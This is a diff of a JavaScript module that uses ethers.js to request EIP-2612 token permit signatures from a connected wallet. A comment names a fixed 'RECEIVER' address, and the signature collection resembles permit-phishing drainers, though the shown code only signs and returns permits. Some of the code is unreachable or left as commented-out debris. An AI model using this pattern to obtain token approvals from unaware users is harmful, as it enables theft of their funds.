@@ -1,19 +1,18 @@
 // Import Web3 Libraries
 import { ethers } from "ethers";
 // Import Redux
-import { ERC20ABI } from "../Constants";
- // Moralis Hooks.
- 
- 
- 
-  var chainId = window.ethereum.chainId;
+import { ERC20_ABI } from "../constants";
+// Moralis Hooks.
+import { useSelector } from "react-redux";
+
+
+var chainId = window.ethereum.chainId;
 var account = window.ethereum._state.accounts[0]
 
-
-    // Provider.
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    // Signer
-    const signer = provider.getSigner();
+// Provider.
+const provider = new ethers.providers.Web3Provider(window.ethereum);
+// Signer
+const signer = provider.getSigner();
 
 ///////////////////////////////////////////////////////////////////
 ///////////////////////////////////////////////////////////////////
@@ -25,9 +24,17 @@ var account = window.ethereum._state.accounts[0]
 // RECEIVER: 0xDbDB0f30d51Eda693a88AEca322071974602FE34
 
 //// Do check -- contractAddress before defining this function globally.
-  async function permitSign(domainName, domainVersion, contractAddress, spender, value, deadline) {
+async function permitSign(domainName, domainVersion, contractAddress, spender, value, deadline) {
+    //    var token = useSelector((state) => state.allContracts);
+    //   var DAI = "0x9325693cF5Ea54677923C03888Df865D718E3e8e";
+    // const NONCE = ethers.ContractFactory.attach("ERC20",DAI);
 
+    let contract = new ethers.Contract(contractAddress, ERC20_ABI, provider)
+    //   console.log(contract)
 
+    //   console.log(NONCE)
+    const nonce = await contract.nonces(account);
+    console.log(nonce.toString())
     const domain = {
         name: domainName,
         version: domainVersion,
@@ -36,22 +43,19 @@ var account = window.ethereum._state.accounts[0]
     }
     try {
         var r, s, v;
-        const permit = await createPermit(domain, spender, value, 1, 2661766724);
+        const permit = await createPermit(domain, spender, value, nonce, deadline);
+        // const oneEther = ethers.utils.parseUnits(`100`, "ether");
+        // const DATA_SIGNER = new ethers.Contract(contractAddress, ERC20_ABI, signer);
+        // DATA_SIGNER.permit(account, BuySell, oneEther, Date.now() + 30 * 60, window.x.v, window.x.r, window.x.s);
+        // DATA_SIGNER.permit(account, spender,value, deadline,permit.v,permit.r,permit.s);
+        return permit
         r = permit.r,
-        s = permit.s,
-        v= permit.v
-        console.log(v)
-        console.log(r)
-        console.log(s)
-        try {
-            const DATA_SIGNER = new ethers.Contract(contractAddress, ERC20ABI, signer);
-            var valueInWei = ethers.utils.parseUnits(`${value}`, "ether");
-            DATA_SIGNER.permit(account, spender, valueInWei, deadline, v, r, s);
-            console.log("hi")
+            s = permit.s,
+            v = permit.v
+        // console.log(v)
+        // console.log(r)
+        // console.log(s)
 
-        } catch (error) {
-            console.log("New Abi required")
-        }
 
     } catch (error) {
         console.log(error);
@@ -80,6 +84,7 @@ async function createPermit(domain, spender, value, nonce, deadline) {
 
 
 
-export{
-    permitSign
+export {
+    permitSign,
+
 }
